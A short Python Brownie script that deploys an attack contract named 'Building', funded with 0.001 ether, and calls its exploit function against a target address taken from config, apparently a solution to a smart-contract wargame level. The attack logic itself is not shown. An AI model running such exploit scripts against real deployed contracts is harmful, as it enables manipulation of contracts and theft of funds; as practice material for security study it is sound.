from brownie import Building, interface, network, config
from scripts.helpful import get_account
from web3 import Web3


def exploit():
    # Get account address
    account = get_account()

    # deploying attack contract
    attack = Building.deploy(5, {"from": account, "value": Web3.toWei(0.001, 'ether')})
    attack.exploit(config['Address'], {"from": account})


def main():
    exploit()
